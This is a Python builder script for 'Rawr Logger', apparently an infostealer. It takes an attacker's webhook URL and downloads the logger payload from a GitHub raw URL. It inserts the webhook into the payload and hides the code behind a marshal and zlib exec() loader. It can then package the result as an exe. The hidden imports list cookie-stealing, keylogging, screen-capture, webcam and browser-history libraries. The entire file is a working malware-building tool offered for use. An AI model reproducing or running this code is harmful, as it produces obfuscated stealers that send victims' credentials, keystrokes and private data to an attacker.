import marshal
import zlib
import os
import time
try:
    import requests
    from pystyle import *
    os.system('pip install pyinstaller')
except:
    print("Installing Requirements For You")
    os.system('pip install requests')
    os.system('pip install pyinstaller')
    os.system('pip install pystyle')
    print("Please Rerun The Program")
    time.sleep(1)

os.system('cls' if os.name == 'nt' else 'clear')
os.system(f'title Rawr Logger Builder!')

Write.Print(Center.XCenter("""
    ____                         __                               
   / __ \____ __      _______   / /   ____  ____ _____ ____  _____
  / /_/ / __ `/ | /| / / ___/  / /   / __ \/ __ `/ __ `/ _ \/ ___/
 / _, _/ /_/ /| |/ |/ / /     / /___/ /_/ / /_/ / /_/ /  __/ /    
/_/ |_|\__,_/ |__/|__/_/     /_____/\____/\__, /\__, /\___/_/     
                                         /____//____/             
              Made By Jose#0001,TheSoap1#9870                                                                                  
\n"""), Colors.green_to_yellow, interval=0)

webhook = Write.Input("\nEnter webhook URL:", Colors.green_to_yellow, interval=0.01)
r = requests.get(webhook)
if r.status_code == 200:
    Write.Print("Webhook Is Working\n", Colors.white_to_green, interval=0.01)
    time.sleep(1)
else:
    Write.Print("Webhook Is Not Working\n", Colors.white_to_red, interval=0.01)
    time.sleep(3)
    exit()

name = Write.Input("Enter File Name:", Colors.green_to_yellow, interval=0.01)

# New raw URL for main.py file
raw_url = "https://raw.githubusercontent.com/Randomfry/Rawr-Logger/refs/heads/rawr-logger/main.py"
code = requests.get(raw_url)
if code.status_code != 200:
    Write.Print("Failed to fetch main.py from GitHub\n", Colors.white_to_red, interval=0.01)
    time.sleep(3)
    exit()

# Replace the placeholder webhook with the user input webhook
code_text = code.text.replace("Webhooksss", webhook)

with open(f"{name}.py", 'w', encoding='utf8') as f:
    f.write(code_text)

Write.Print("Rawr Logger Was Successfully Built\n", Colors.white_to_green, interval=0.01)

prot = Write.Input(f"Adding Protection Now To {name} Also Click Enter To Continue", Colors.white_to_green, interval=0.01)

with open(f'{name}.py', 'r', encoding='utf8') as fi:
    pro = fi.read()
    mar = marshal.dumps(pro)
    zlb = zlib.compress(mar)
    with open(f"{name}.py", 'w', encoding='utf8') as f:
        f.write(f"import marshal,zlib;exec(marshal.loads(zlib.decompress({zlb})))")

compile = Write.Input("Would You Like To Compile To An Exe? y/n:", Colors.green_to_yellow, interval=0.01)
if compile.lower() == "y":
    os.system(f'pyinstaller --onefile --hidden-import=requests --hidden-import=os --hidden-import=socket --hidden-import=threading --hidden-import=platform --hidden-import=json --hidden-import=browser_cookie3 --hidden-import=cv2 --hidden-import=re --hidden-import=uuid --hidden-import=keyboard --hidden-import=Chrome --hidden-import=psutil --hidden-import=sys --hidden-import=pynput --hidden-import=PIL --hidden-import=PIL.ImageGrab --hidden-import=browser_history --hidden-import=win32api {name}.py')
    try:
        os.remove(f'{name}.spec')
    except:
        pass
    Write.Print(f"{name} Was Successfully Compiled In Dist Folder\n", Colors.white_to_green, interval=0.01)
    time.sleep(2)
    Write.Print("This Program Will Now Exit In 3 Secs Thank You For Using Rawr Logger\n", Colors.white_to_green, interval=0.01)
    time.sleep(3)
    exit()
elif compile.lower() == "n":
    Write.Print("Thank You For Using Rawr Logger\n", Colors.white_to_green, interval=0.01)
    time.sleep(3)
    exit()
